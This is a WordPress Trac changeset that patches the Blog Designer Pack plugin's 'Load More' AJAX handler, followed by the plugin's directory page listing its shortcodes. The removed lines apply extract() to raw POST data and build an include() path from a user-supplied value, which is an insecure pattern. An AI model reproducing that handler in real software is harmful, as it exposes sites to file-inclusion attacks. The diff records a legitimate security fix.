=== Content from plugins.trac.wordpress.org_e013026f_20250111_063906.html ===


[Skip to content](#main)

[WordPress.org](https://wordpress.org/)

* [News](https://wordpress.org/news/)
* [Download & Extend](https://wordpress.org/download/)
  + [Get WordPress](https://wordpress.org/download/)
  + [Themes](https://wordpress.org/themes/)
  + [Patterns](https://wordpress.org/patterns/)
  + [Plugins](https://wordpress.org/plugins/)
  + [Mobile](https://wordpress.org/mobile/)
  + [Hosting](https://wordpress.org/hosting/)
  + [Openverse ↗︎](https://openverse.org/)
* [Learn](https://learn.wordpress.org/)
  + [Learn WordPress](https://learn.wordpress.org/)
  + [Documentation](https://wordpress.org/documentation/)
  + [Forums](https://wordpress.org/support/forums/)
  + [Developers](https://developer.wordpress.org/)
  + [WordPress.tv ↗︎](https://wordpress.tv/)
* [Community](https://make.wordpress.org/)
  + [Make WordPress](https://make.wordpress.org/)
  + [Photo Directory](https://wordpress.org/photos/)
  + [Five for the Future](https://wordpress.org/five-for-the-future/)
  + [WordCamp ↗︎](https://central.wordcamp.org/)
  + [Meetups ↗︎](https://www.meetup.com/pro/wordpress/)
  + [Job Board ↗︎](https://jobs.wordpress.net/)
* [About](https://wordpress.org/about/)
  + [About WordPress](https://wordpress.org/about/)
  + [Showcase](https://wordpress.org/showcase/)
  + [Enterprise](https://wordpress.org/enterprise/)
  + [Gutenberg ↗︎](https://wordpress.org/gutenberg/)
  + [WordPress Swag Store ↗︎](https://mercantile.wordpress.org/)
* [Get WordPress](https://wordpress.org/download/)

Search Trac

[Get WordPress](https://wordpress.org/download/)

## [Plugin Directory](//wordpress.org/plugins/)

Search:

* [Login](https://login.wordpress.org/?redirect_to=http%3A%2F%2Fplugins.trac.wordpress.org%2Fchangeset%3Fnew%3D2984052%2540blog-designer-pack%26old%3D2984052%2540blog-designer-pack)

* [Timeline](/timeline)
* [View Tickets](/report)
* [Browse Source](/browser)

## Context Navigation

* ← [Previous Change](/changeset/2958069/blog-designer-pack "Changeset 2958069 for blog-designer-pack")
* [Next Change](/changeset/2996380/blog-designer-pack "Changeset 2996380 for blog-designer-pack") →

---

# Changeset [2984052](/changeset/2984052 "Show full changeset") for [blog-designer-pack](/browser/blog-designer-pack?rev=2984052 "Show entry in browser")

View differences
inline
side by side

Show
lines around each change

Show the changes in full context

Ignore:

Blank lines

Case changes

White space changes

Timestamp:
10/25/2023 09:14:37 PM
([15 months](/timeline?from=2023-10-25T21%3A14%3A37Z&precision=second "See timeline at 10/25/2023 09:14:37 PM") ago)

Author:
pluginandplay
Message:

Update Load More functionality with better security.

Location:
[blog-designer-pack/trunk](/browser/blog-designer-pack/trunk?rev=2984052)
Files:

4 edited

* [blog-designer-pack.php](/browser/blog-designer-pack/trunk/blog-designer-pack.php?rev=2984052 "Show entry in browser")
  (modified)
  ([2 diffs](#file0 "Show differences"))
* [includes/bdp-ajax-functions.php](/browser/blog-designer-pack/trunk/includes/bdp-ajax-functions.php?rev=2984052 "Show entry in browser")
  (modified)
  ([5 diffs](#file1 "Show differences"))
* [includes/shortcodes/bdp-post-masonry.php](/browser/blog-designer-pack/trunk/includes/shortcodes/bdp-post-masonry.php?rev=2984052 "Show entry in browser")
  (modified)
  ([2 diffs](#file2 "Show differences"))
* [readme.txt](/browser/blog-designer-pack/trunk/readme.txt?rev=2984052 "Show entry in browser")
  (modified)
  ([2 diffs](#file3 "Show differences"))

### Legend:

Unmodified
Added
Removed

* ## [blog-designer-pack/trunk/blog-designer-pack.php](/changeset/2984052/blog-designer-pack/trunk/blog-designer-pack.php "Show the changeset 2984052 restricted to blog-designer-pack/trunk/blog-designer-pack.php")

  | [r2939212](/browser/blog-designer-pack/trunk/blog-designer-pack.php?rev=2939212#L3 "Show revision 2939212 of this file in browser") | [r2984052](/browser/blog-designer-pack/trunk/blog-designer-pack.php?rev=2984052#L3 "Show revision 2984052 of this file in browser") |  |
  | --- | --- | --- |
  | 3 | 3 | \* Plugin Name: Blog Designer Pack |
  | 4 | 4 | \* Plugin URI: https://premium.infornweb.com/news-blog-designer-pack-pro/ |
  | 5 |  | \* Version: 3.4.~~1~~ |
  |  | 5 | \* Version: 3.4.2 |
  | 6 | 6 | \* Description: Display blog posts on your website with 6 blog layouts (2 designs for each blog layout) plus 1 Ticker and 2 Widgets |
  | 7 | 7 | \* Text Domain: blog-designer-pack |
  | […](/browser/blog-designer-pack/trunk/blog-designer-pack.php?rev=2939212#L26) | […](/browser/blog-designer-pack/trunk/blog-designer-pack.php?rev=2984052#L26) |  |
  | 26 | 26 | \*/ |
  | 27 | 27 | if( ! defined( 'BDP\_VERSION' ) ) { |
  | 28 |  | define( 'BDP\_VERSION', '3.4.~~1~~' ); // Version of plugin |
  |  | 28 | define( 'BDP\_VERSION', '3.4.2' ); // Version of plugin |
  | 29 | 29 | } |
  | 30 | 30 | if( ! defined( 'BDP\_DIR' ) ) { |
* ## [blog-designer-pack/trunk/includes/bdp-ajax-functions.php](/changeset/2984052/blog-designer-pack/trunk/includes/bdp-ajax-functions.php "Show the changeset 2984052 restricted to blog-designer-pack/trunk/includes/bdp-ajax-functions.php")

  | [r2633194](/browser/blog-designer-pack/trunk/includes/bdp-ajax-functions.php?rev=2633194#L26 "Show revision 2633194 of this file in browser") | [r2984052](/browser/blog-designer-pack/trunk/includes/bdp-ajax-functions.php?rev=2984052#L26 "Show revision 2984052 of this file in browser") |  |
  | --- | --- | --- |
  | 26 | 26 | \*/ |
  | 27 | 27 | function bdp\_get\_more\_post() { |
  | 28 |  |  |
  |  | 28 |  |
  | 29 | 29 | // Taking some defaults |
  | 30 | 30 | $result = array(); |
  | 31 |  |  |
  | 32 |  | if( !empty($\_POST['shrt\_param']) ) { |
  | 33 |  |  |
  | 34 |  | global $post, $bdp\_in\_shrtcode; |
  | 35 |  |  |
  | 36 |  | extract( $\_POST['shrt\_param'] ); |
  | 37 |  |  |
  | 38 |  | $design\_file\_path   = BDP\_DIR . '/templates/masonry/' . $design . '.php'; |
  | 39 |  | $design\_file        = (file\_exists($design\_file\_path))  ? $design\_file\_path : ''; |
  | 40 |  | $shortcode\_atts     = $\_POST['shrt\_param']; // Assigning it to variable |
  | 41 |  |  |
  | 42 |  | $args = array ( |
  | 43 |  | 'post\_type'         => BDP\_POST\_TYPE, |
  | 44 |  | 'orderby'           => !empty($orderby)     ? $orderby : 'post\_date', |
  | 45 |  | 'order'             => !empty($order)       ? $order    : 'DESC', |
  | 46 |  | 'posts\_per\_page'    => !empty($posts\_per\_page)      ? $posts\_per\_page   : '10', |
  | 47 |  | 'paged'             => !empty($\_POST['paged'])      ? $\_POST['paged']   : '1', |
  | 48 |  |  |
  | 49 |  | ); |
  | 50 |  |  |
  |  | 31 |  |
  |  | 32 | if( ! empty( $\_POST['shrt\_param'] ) ) { |
  |  | 33 |  |
  |  | 34 | global $post; |
  |  | 35 |  |
  |  | 36 | // phpcs:ignore WordPress.Security.NonceVerification |
  |  | 37 | $atts = $\_POST['shrt\_param']; // WPCS: input var okay, CSRF ok. |
  |  | 38 |  |
  |  | 39 | $shortcode\_designs  = bdp\_post\_masonry\_designs(); |
  |  | 40 | $msonry\_effects     = bdp\_post\_masonry\_effects(); |
  |  | 41 | $design             = ($atts['design'] && (array\_key\_exists(trim($atts['design']), $shortcode\_designs))) ? trim( $atts['design'] )  : 'design-1'; |
  |  | 42 | $order              = ( strtolower( $atts['order'] ) == 'asc' )     ? 'ASC'                     : 'DESC'; |
  |  | 43 | $orderby            = ! empty( $atts['orderby'] )                   ? $atts['orderby']          : 'post\_date'; |
  |  | 44 | $posts\_per\_page     = ! empty( $atts['posts\_per\_page'] )            ? $atts['posts\_per\_page']   : 10; |
  |  | 45 | $grid               = ! empty( $atts['grid'] )                      ? $atts['grid']             : 2; |
  |  | 46 | $cat                = ! empty( $atts['cat'] )                       ? $atts['cat']              : ''; |
  |  | 47 | $paged              = ! empty( $\_POST['paged'] )                    ? intval( $\_POST['paged'] ) : 1; |
  |  | 48 |  |
  |  | 49 | $words\_limit        = ! empty( $atts['words\_limit'] )               ? $atts['words\_limit']      : 20; |
  |  | 50 | $media\_size         = ! empty( $atts['media\_size'] )                ? $atts['media\_size']       : 'large'; //thumbnail, medium, large, full |
  |  | 51 | $showCategory       = ( $atts['showCategory'] == 'true')            ? 'true'                    : 'false'; |
  |  | 52 | $showDate           = ( $atts['showDate'] == 'true' )               ? 'true'                    : 'false'; |
  |  | 53 | $showAuthor         = ( $atts['showAuthor'] == 'false')             ? 'false'                   : 'true'; |
  |  | 54 | $show\_comments      = ( $atts['show\_comments'] == 'false' )         ? 'false'                   : 'true'; |
  |  | 55 | $showContent        = ( $atts['showContent'] == 'true' )            ? 'true'                    : 'false'; |
  |  | 56 | $show\_tags          = ( $atts['show\_tags'] == 'false' )             ? 'false'                   : 'true'; |
  |  | 57 | $showreadmore       = ( $atts['showreadmore'] == 'true' )           ? 'true'                    : 'false'; |
  |  | 58 |  |
  |  | 59 | $design\_file        = BDP\_DIR . "/templates/masonry/{$design}.php"; |
  |  | 60 |  |
  |  | 61 | $args = array( |
  |  | 62 | 'post\_type'             => BDP\_POST\_TYPE, |
  |  | 63 | 'post\_status'           => array('publish'), |
  |  | 64 | 'orderby'               => $orderby, |
  |  | 65 | 'order'                 => $order, |
  |  | 66 | 'posts\_per\_page'        => $posts\_per\_page, |
  |  | 67 | 'paged'                 => $paged, |
  |  | 68 | 'ignore\_sticky\_posts'   => true, |
  |  | 69 | ); |
  |  | 70 |  |
  | 51 | 71 | // Category Parameter |
  | 52 |  | if(~~$cat != ""~~) { |
  |  | 72 | if( $cat != "" ) { |
  | 53 | 73 | $args['tax\_query'] = array( |
  | 54 | 74 | array( |
  | […](/browser/blog-designer-pack/trunk/includes/bdp-ajax-functions.php?rev=2633194#L57) | […](/browser/blog-designer-pack/trunk/includes/bdp-ajax-functions.php?rev=2984052#L77) |  |
  | 57 | 77 | 'field'     => ( isset($cat[0]) && is\_numeric($cat[0]) ) ? 'term\_id' : 'slug', |
  | 58 | 78 | )); |
  | 59 |  | } |
  |  | 79 | } |
  | 60 | 80 |  |
  | 61 |  | $blog\_posts = new WP\_Query(~~$args~~); |
  |  | 81 | $blog\_posts = new WP\_Query( $args ); |
  | 62 | 82 |  |
  | 63 | 83 | ob\_start(); |
  | […](/browser/blog-designer-pack/trunk/includes/bdp-ajax-functions.php?rev=2633194#L66) | […](/browser/blog-designer-pack/trunk/includes/bdp-ajax-functions.php?rev=2984052#L86) |  |
  | 66 | 86 |  |
  | 67 | 87 | while ( $blog\_posts->have\_posts() ) : $blog\_posts->the\_post(); |
  | 68 |  |  |
  |  | 88 |  |
  | 69 | 89 | $blog\_links             = array(); |
  | 70 |  | ~~$terms                  = get\_the\_terms( $post->ID, BDP\_CAT );~~ |
  | 71 | 90 | $post\_link              = bdp\_get\_post\_link( $post->ID ); |
  | 72 | 91 | $bdp\_author             = get\_the\_author(); |
  | […](/browser/blog-designer-pack/trunk/includes/bdp-ajax-functions.php?rev=2633194#L76) | […](/browser/blog-designer-pack/trunk/includes/bdp-ajax-functions.php?rev=2984052#L95) |  |
  | 76 | 95 | $comments               = get\_comments\_number( $post->ID ); |
  | 77 | 96 | $reply                  = ($comments <= 1) ? esc\_html\_\_('Reply', 'blog-designer-pack') : esc\_html\_\_('Replies', 'blog-designer-pack'); |
  | 78 |  |  |
  | 79 |  | if(~~$terms~~) { |
  |  | 97 |  |
  |  | 98 | if( $terms ) { |
  | 80 | 99 | foreach ( $terms as $term ) { |
  | 81 | 100 | $term\_link = get\_term\_link( $term ); |
  | […](/browser/blog-designer-pack/trunk/includes/bdp-ajax-functions.php?rev=2633194#L84) | […](/browser/blog-designer-pack/trunk/includes/bdp-ajax-functions.php?rev=2984052#L103) |  |
  | 84 | 103 | } |
  | 85 | 104 | $cate\_name = join( " ", $blog\_links ); |
  | 86 |  | if( $design\_file ) { |
  |  | 105 |  |
  |  | 106 | // Include design HTML file |
  | 87 | 107 | include( $design\_file ); |
  | 88 |  | } |
  |  | 108 |  |
  | 89 | 109 | endwhile; // End while loop |
  | 90 |  | } |
  | 91 |  | $data = ob\_get\_clean(); |
  | 92 |  |  |
  | 93 |  | $result['success']  = 1; |
  | 94 |  | $result['data']     = $data; |
  |  | 110 | } |
  |  | 111 |  |
  |  | 112 | $data = ob\_get\_clean(); |
  |  | 113 |  |
  |  | 114 | $result['success']  = 1; |
  |  | 115 | $result['data']     = $data; |
  | 95 | 116 |  |
  | 96 | 117 | } else { |
  | 97 | 118 | $result['success']  = 0; |
  | 98 | 119 | } |
  |  | 120 |  |
  | 99 | 121 | wp\_send\_json($result); |
  | 100 | 122 | } |
* ## [blog-designer-pack/trunk/includes/shortcodes/bdp-post-masonry.php](/changeset/2984052/blog-designer-pack/trunk/includes/shortcodes/bdp-post-masonry.php "Show the changeset 2984052 restricted to blog-designer-pack/trunk/includes/shortcodes/bdp-post-masonry.php")

  | [r2844252](/browser/blog-designer-pack/trunk/includes/shortcodes/bdp-post-masonry.php?rev=2844252#L41 "Show revision 2844252 of this file in browser") | [r2984052](/browser/blog-designer-pack/trunk/includes/shortcodes/bdp-post-masonry.php?rev=2984052#L41 "Show revision 2984052 of this file in browser") |  |
  | --- | --- | --- |
  | 41 | 41 | $msonry\_effects     = bdp\_post\_masonry\_effects(); |
  | 42 | 42 | $posts\_per\_page     = (!empty($limit))                      ? $limit            : 10; |
  | 43 |  | $cat                = (!empty($category))                   ? explode(',',$category) : ''; |
  |  | 43 | $cat                = (!empty($category))                   ? explode(',',$category) : ''; |
  | 44 | 44 | $design             = ($design && (array\_key\_exists(trim($design), $shortcode\_designs))) ? trim($design)    : 'design-1'; |
  | 45 | 45 | $pagination         = ($pagination == 'true')               ? 'true'            : 'false'; |
  | […](/browser/blog-designer-pack/trunk/includes/shortcodes/bdp-post-masonry.php?rev=2844252#L86) | […](/browser/blog-designer-pack/trunk/includes/shortcodes/bdp-post-masonry.php?rev=2984052#L86) |  |
  | 86 | 86 | // WP Query Parameters |
  | 87 | 87 | $args = array ( |
  | 88 |  | 'post\_type'       => BDP\_POST\_TYPE, |
  | 89 |  | 'post\_status'          => array('publish'), |
  | 90 |  | 'order'       => $order, |
  | 91 |  | 'orderby'       => $orderby, |
  | 92 |  | 'posts\_per\_page'~~=> $posts\_per\_page,~~ |
  | 93 |  | 'paged'       => $paged, |
  |  | 88 | 'post\_type'             => BDP\_POST\_TYPE, |
  |  | 89 | 'post\_status'           => array('publish'), |
  |  | 90 | 'order'                 => $order, |
  |  | 91 | 'orderby'               => $orderby, |
  |  | 92 | 'posts\_per\_page'        => $posts\_per\_page, |
  |  | 93 | 'paged'                 => $paged, |
  | 94 | 94 | 'ignore\_sticky\_posts'   => true, |
  | 95 | 95 | ); |
* ## [blog-designer-pack/trunk/readme.txt](/changeset/2984052/blog-designer-pack/trunk/readme.txt "Show the changeset 2984052 restricted to blog-designer-pack/trunk/readme.txt")

  | [r2958069](/browser/blog-designer-pack/trunk/readme.txt?rev=2958069#L3 "Show revision 2958069 of this file in browser") | [r2984052](/browser/blog-designer-pack/trunk/readme.txt?rev=2984052#L3 "Show revision 2984052 of this file in browser") |  |
  | --- | --- | --- |
  | 3 | 3 | Tags: blog, news, blog design, blog layout, blog grid, blog list, blog slider, blog page builder, post ticker, news, news page, blog template, modify blog design, post slider, post carousel, custom blog template, blog layout design, custom blog layout, modify blog design, blog,  posts in page, blog in page, grid blog template, list blog template, masonry blog template, slider blog template, carousel blog template, blog widgets, post filter |
  | 4 | 4 | Requires at least: 4.0 |
  | 5 |  | Tested up to: 6.3 |
  |  | 5 | Tested up to: 6.3.2 |
  | 6 | 6 | Requires PHP: 5.4 |
  | 7 |  | Stable tag: 3.4.~~1~~ |
  |  | 7 | Stable tag: 3.4.2 |
  | 8 | 8 | License: GPLv2 or later |
  | 9 | 9 | License URI: http://www.gnu.org/licenses/gpl-2.0.html |
  | […](/browser/blog-designer-pack/trunk/readme.txt?rev=2958069#L348) | […](/browser/blog-designer-pack/trunk/readme.txt?rev=2984052#L348) |  |
  | 348 | 348 | == Changelog == |
  | 349 | 349 |  |
  |  | 350 | = 3.4.2 (26 Oct, 2023) = |
  |  | 351 | \* [\*] Update Load More functionality with better security. |
  |  | 352 |  |
  | 350 | 353 | = 3.4.1 (17 July, 2023) = |
  | 351 | 354 | \* [\*] Update Freemius SDK to latest version 2.5.10 |

**Note:** See [TracChangeset](/wiki/TracChangeset)
for help on using the changeset viewer.

[Trac UI Preferences](/prefs)
### Download in other formats:

* [Unified Diff](?format=diff&new=2984052)
* [Zip Archive](?format=zip&new=2984052)

* [About](https://wordpress.org/about/)
* [News](https://wordpress.org/news/)
* [Hosting](https://wordpress.org/hosting/)
* [Donate](https://wordpressfoundation.org/donate/)
* [Swag](https://mercantile.wordpress.org/)

* [Documentation](https://wordpress.org/documentation/)
* [Developers](https://developer.wordpress.org/)
* [Get Involved](https://make.wordpress.org/)
* [Learn](https://learn.wordpress.org/)

* [Showcase](https://wordpress.org/showcase/)
* [Plugins](https://wordpress.org/plugins/)
* [Themes](https://wordpress.org/themes/)
* [Patterns](https://wordpress.org/patterns/)

* [WordCamp](https://central.wordcamp.org/)
* [WordPress.TV](https://wordpress.tv/)
* [BuddyPress](https://buddypress.org/)
* [bbPress](https://bbpress.org/)

* [WordPress.com](https://wordpress.com/?ref=wporg-footer)
* [Matt](https://ma.tt/)
* [Privacy](https://wordpress.org/about/privacy/)
* [Public Code](https://publiccode.eu/)

[WordPress.org](https://wordpress.org/)

[WordPress.org](https://wordpress.org/)

* [Visit our Facebook page](https://www.facebook.com/WordPress/)
* [Visit our Twitter account](https://twitter.com/WordPress)
* [Visit our Instagram account](https://www.instagram.com/wordpress/)
* [Visit our LinkedIn account](https://www.linkedin.com/company/wordpress)

![Code is Poetry](https://s.w.org/style/images/code-is-poetry-for-dark-bg.svg)



=== Content from wordpress.org_204632f0_20250111_063907.html ===


[WordPress.org](https://wordpress.org/)

* [News](https://wordpress.org/news/)
* [Showcase](https://wordpress.org/showcase/)
* [Hosting](https://wordpress.org/hosting/)
* Extend
  + [Themes](https://wordpress.org/themes/)
  + [Plugins](https://wordpress.org/plugins/)
  + [Patterns](https://wordpress.org/patterns/)
  + [Blocks](https://wordpress.org/blocks/)
  + [Openverse ↗︎](https://openverse.org/)
* Learn
  + [Learn WordPress](https://learn.wordpress.org/)
  + [Documentation](https://wordpress.org/documentation/)
  + [Forums](https://wordpress.org/support/forums/)
  + [Developers](https://developer.wordpress.org/)
  + [WordPress.tv ↗︎](https://wordpress.tv/)
* Community
  + [Make WordPress](https://make.wordpress.org/)
  + [Photo Directory](https://wordpress.org/photos/)
  + [Five for the Future](https://wordpress.org/five-for-the-future/)
  + [Events](https://events.wordpress.org/)
  + [Job Board ↗︎](https://jobs.wordpress.net/)
* About
  + [About WordPress](https://wordpress.org/about/)
  + [Enterprise](https://wordpress.org/enterprise/)
  + [Gutenberg ↗︎](https://wordpress.org/gutenberg/)
* [Get WordPress](https://wordpress.org/download/)

Search in WordPress.org

[Get WordPress](https://wordpress.org/download/)

[WordPress.org](https://wordpress.org/)

[Plugin Directory](https://wordpress.org/plugins/)

Blog Grid & Post Grid – Blog Post Slider, Blog Post Carousel, Blog Post Ticker, Blog Post Masonry, Category Post Grid By News & Blog Designer Pack

* [Submit a plugin](https://wordpress.org/plugins/developers/)
* [My favorites](https://wordpress.org/plugins/browse/favorites/)
* [Log in](https://login.wordpress.org/?redirect_to=https%3A%2F%2Fwordpress.org%2Fplugins%2Fblog-designer-pack&locale=en_US)

* [Submit a plugin](https://wordpress.org/plugins/developers/)
* [My favorites](https://wordpress.org/plugins/browse/favorites/)
* [Log in](https://login.wordpress.org/?redirect_to=https%3A%2F%2Fwordpress.org%2Fplugins%2Fblog-designer-pack&locale=en_US)

Search plugins

![](https://ps.w.org/blog-designer-pack/assets/banner-772x250.png?rev=3192605)
![](https://ps.w.org/blog-designer-pack/assets/icon-128x128.png?rev=1917237)
# Blog Grid & Post Grid – Blog Post Slider, Blog Post Carousel, Blog Post Ticker, Blog Post Masonry, Category Post Grid By News & Blog Designer Pack

By [InfornWeb](https://premium.infornweb.com)

[Download](https://downloads.wordpress.org/plugin/blog-designer-pack.3.4.10.zip)

* [Details](https://wordpress.org/plugins/blog-designer-pack/#description)
* [Reviews](https://wordpress.org/plugins/blog-designer-pack/#reviews)
* [Installation](https://wordpress.org/plugins/blog-designer-pack/#installation)
* [Development](https://wordpress.org/plugins/blog-designer-pack/#developers)

[Support](https://wordpress.org/support/plugin/blog-designer-pack/)

## Description

News & Blog Designer Pack – Everything you need to build a beautiful magazine, news, blog website or blog page.

News & Blog Designer Pack – WordPress Blog Plugin can be used as a news & blog page builder to create a news page or blog page with post grid, post slider, post carousel, post list, post masonry, post filter, recent posts, popular posts, post ticker, post grid box, post timeline, featured posts etc.

#### ✅ Blog Designer Pack having 7 blog layouts/shortcodes:

* 6 shortcodes with 2 designs for each blog layout or news layout.
* 1 Post ticker shortcode.
* 2 Widgets (Latest posts and Post vertical scrolling).

View [FREE DEMO](https://demo.infornweb.com/blog-designer-pack-demo/) for more details.

Checkout [Premium Version Demo](https://premium.infornweb.com/news-blog-designer-pack-pro/) | [Buy Premium Version](https://premium.infornweb.com/news-blog-designer-pack-pro/) for more designs and options.

> 🌟 **Premium Version** supports Custom Post Type, Custom Taxonomy, Custom Tags, Featured Posts, Trending Posts, Timeline, Post Filtering with Categories Or Tags, Category Grid, Category Slider as well as many cool features.
>
> You can get [News & Blog Designer Pack Premium here](https://premium.infornweb.com/news-blog-designer-pack-pro/)!

#### ✅ Blog Designer Pack is perfect for:

* Post Grid, News Grid or Blog Grid
* Post Carousel, News Carousel or Blog Carousel
* Post Slider, News Slider or Blog Slider
* Post List, News List or Blog List
* Post Masonry, News Masonry or Blog Masonry
* Post Grid Box, News Grid Box or Blog Grid Box
* Post Ticker, News Ticker or Blog Ticker
* Post Vertical Scrolling, News Vertical Scrolling or Blog Vertical Scrolling
* Post Filtering with Categories Or Tags.

News & Blog Designer Pack is the #1 plugin for creating fully customized News, Magazines, Review Websites, Personal Blogs, Travel Blogs, Fashion Blogs, Viral News, Food Reviews, Recipes Blogs, etc.

#### ✅ Best News, Magazine & Blog Building Tool

News & Blog Designer Pack is mostly used for creating News Magazine sites. So, It is also well known as News Plugin. However, it is a multi-functional plugin that fulfills all required features for creating blogs along with news and magazine sites.

#### ✅ Blog Designer Pack contains 7 shortcodes

* `[bdp_post]` : Display blog post or news post in grid view.
* `[bdp_post_list]` : Display blog post or news post in list view.
* `[bdp_masonry]` : Display blog post or news post in masonry layouts.
* `[bdp_post_slider]` : Display recent blog post or news post in slider view.
* `[bdp_post_carousel]` : Display recent blog post or news post in carousel view.
* `[bdp_post_gridbox]` : Display blog post or news post in grid box layout.
* `[bdp_ticker]` : Display blog post or news post in ticker.

#### Common Shortcode Parameters for all

* **Limit:**

  limit=”10″ (i.e. Display 5 blog posts on your website and then pagination. To show all posts use limit=”-1″)
* **Display by Category**

  category=”category\_ID” OR category=”category\_slug” (i.e. Display blog posts by their category ID OR Slug)
* **Design:**

  design=”design-1″ (Select design for blog post. There are 2 designs. design-1 and design-2)
* **Show Blog Author:**

  show\_author=”false” (Show blog post author or not. Values are true or false)
* **Show Blog Category:**

  show\_category=”false” (Show blog post category or not. Values are true or false)
* **Show Blog Date:**

  show\_date=”false” (Show blog post date or not. Values are true or false)
* **Show Blog Content:**

  show\_content=”false” (Show blog post content or not. Values are true or false)
* **Content Words Limit:**

  content\_words\_limit=”40″ (Set blog post content words limit.)
* **Media Size:**

  media\_size=”large” (Set media size for post. Values are thumbnail, medium, medium\_large, large, full)
* **Show Read More:**

  show\_read\_more=”true” (Show read more button of blog post. Values are true or false)
* **Post Order:**

  order=”DESC” (Designates the ascending or descending order of the ‘orderby’ parameter. Defaults to ‘DESC’. Values are “DESC” and “ASC”)
* **Post Order by :**

  orderby=”post\_date” (Sort retrieved posts by parameter. Defaults to ‘date’ (post\_date). One or more options can be passed. ‘none’, ID’, ‘author’, ‘title’, ‘name’, ‘rand’, ‘date’)
* **Show Tags:**

  show\_tags=”true” (Show tags of blog post. Values are true or false)
* **Show Comments:**

  show\_comments=”true” (Show comments of blog post. Values are true or false)

#### Others Shortcode Parameters Grid Shortcode

```
[bdp_post]

```

* **Post Grid :**

  [bdp\_post grid=”2″] (Set blog post grid i.e. 1 or 2 or 3 or 4 or 5)
* **Post Pagination :**

  [bdp\_post pagination=”true”] (Show blog post pagination or not. Values are true or false)

#### Others Shortcode Parameters List Shortcode

```
[bdp_post_list]

```

* **Post Pagination :**

  [bdp\_post\_list pagination=”true”] (Show blog post pagination or not. Values are true or false)

#### Others Shortcode Parameters Masonry Shortcode

```
[bdp_masonry]

```

* **Post Grid :**

  [bdp\_masonry grid=”2″] (Set blog post grid i.e. 1 or 2 or 3 or 4 or 5)
* **Post Pagination :**

  [bdp\_masonry pagination=”true”] (Show blog post pagination or not. Values are true or false)
* **Load More Post Effect :**

  [bdp\_masonry effect=”effect-2″] (Set effect when you click on load more post button. There are 2 effects)
* **Load More Text :**

  [bdp\_masonry load\_more\_text=”Load More Post”] (Change the text as per your need)

#### Others Shortcode Parameters Slider Shortcode

```
[bdp_post_slider]

```

* **Pagination and arrows:**

  [bdp\_post\_slider dots=”false” arrows=”false”]
* **Auto Play and Auto Play Interval:**

  [bdp\_post\_slider autoplay=”true” autoplay\_interval=”2000″]
* **Slide Speed:**

  [bdp\_post\_slider speed=”1000″]
* **Loop:**

  [bdp\_post\_slider loop=”true”] ( Display slider in Loop OR not : You can use “true” OR “false”)

#### Others Shortcode Parameters Carousel Shortcode

```
[bdp_post_carousel]

```

* **Number of Posts Show at a Time:**

  [bdp\_post\_carousel slide\_show=”3″]
* **Number of Posts Scroll at a Time:**

  [bdp\_post\_carousel slide\_scroll=”1″]
* **Pagination and arrows:**

  [bdp\_post\_carousel dots=”false” arrows=”false”]
* **Autoplay and Autoplay Interval:**

  [bdp\_post\_carousel autoplay=”true” autoplay\_interval=”2000″]
* **Slide Speed:**

  [bdp\_post\_carousel speed=”1000″]
* **Loop:**

  [bdp\_post\_carousel loop=”true”] (Display slider in Loop OR not : You can use “true” OR “false”)

#### Others Shortcode Parameters GridBox Shortcode

```
[bdp_post_gridbox]

```

* **Post Pagination :**

  [bdp\_post\_gridbox pagination=”true”] (Show post pagination or not. Values are “true” or “false”)

#### Others Shortcode Parameters Ticker Shortcode

```
[bdp_ticker]

```

* **Ticker Title :**

  [bdp\_ticker ticker\_title=”Latest”] (Set Ticker title)
* **Ticker Theme Color :**

  [bdp\_ticker theme\_color=”#2096cd”]
* **Ticker Heading Font Color :**

  [bdp\_ticker heading\_font\_color=”#fff”]
* **Ticker Heading Font Color :**

  [bdp\_ticker heading\_font\_color=”#fff”]
* **Ticker Font Style :**

  [bdp\_ticker font\_style=”normal”]
* **Ticker Effect :**

  [bdp\_ticker ticker\_effect=”slide-v”] (You can use slide-v or slide-h)
* **Ticker Auto Play :**

  [bdp\_ticker autoplay=”true”] (You can use “true” OR “false”)
* **Ticker Speed :**

  [bdp\_ticker speed=”3000″]

Others parameter for ticker i.e. ‘category’, ‘order’ and ‘orderby’ you can use from common shortcodes.

Blog Designer Pack is a good handy and free solution for everyone who is looking for a responsive blog page with the website. Blog Designer pack provides you with a variety of 6 different blog templates to setup your blog page for any WordPress websites. Sometimes, we always stick with one blog layout as per theme, but it’s not easy to change or modify only blog layout very easily, only you can do it by modifying code and CSS files.

However, using Blog Designer Pack plugin you can design your blog page as per your choice to give it a WOW factor. Also you can modify various settings very quickly with the help of Blog Designer pack plugin shortcode parameters. So, beginners can start blogging within 5 minutes, no coding skill required.

#### ✅ PRO Features Include :

> **Premium Version**
>
> \* 90+ News and Blog Designs.
>
> \* Post Filtering with Categories Or Tags.
>
> \* Create multiple news and blog layout.
>
> \* Works with any Custom Post Type.
>
> \* Works with any Custom Taxonomy.
>
> \* Works with any Custom Tags.
>
> \* Set custom link for blog post or news post.
>
> \* Display Blog in a Timeline View.
>
> \* Category Grid View.
>
> \* Category Slider View.
>
> \* Featured Post Functionality.
>
> \* Trending Post Functionality.
>
> \* Multiple Post Type Functionality.
>
> \* 5 Types of different pagination.
>
> \* Load More and Prev – Next Ajax Pagination.
>
> \* Infinite Scroll Pagination.
>
> \* Shortcode Generator with Live Preview Panel – No hassles for documentation.
>
> \* Amazing Shortcode Template Functionality – Control your shortcode from one place on various location!!
>
> \* Set “Order” and “Orderby” sorting parameters via shortcode.
>
> \* Drag & Drop Post Order Change.
>
> \* WPBakery Page Builder support.
>
> \* Elementor Page Builder support.
>
> \* Slider RTL support.
>
> \* 100% Multi language.
>
> \* Many more other features also…
>
> View [PRO DEMO and Features](https://premium.infornweb.com/news-blog-designer-pack-pro/) for additional information.

#### ✅ Post Filtering with Categories Or Tags

Post Filter is an option where you can choose the category, tag or taxonomy to filter the posts. You can also use 6 different types of pagination. Category ajax filter is fully responsive and come with 3 position i.e. top, left and right. You can also align them to left, center and right when position will be top.

#### ✅ Ajax Pagination

Ajax Pagination is similar to the Ajax filter that helps to explore posts or blog without reloading the whole page. Blog Designer Pack offers 6 types of pagination, which include:

* Numeric
* Numeric with Ajax
* Prev & Next
* Prev & Next with Ajax
* Load More
* Infinite Scroll

#### ✅ Where Blog Designer Pack plugin is useful ?

* Blog section or blog page of website.
* News section or news page of website.
* Post Filtering with Categories Or Tags.
* Blogging website.
* News magazine website.
* Business & Technology idea sharing.
* Your company story timeline.
* My achievements (timeline).
* Fashion blog website.
* Latest blog trending posts.
* Latest blog featured posts.
* NGO website to share news/update.
* Personal blog site.

Logo credit : [Freepik](https://www.freepik.com/free-vector/collection-of-abstract-colored-logos-with-letter-b_1193011.htm)

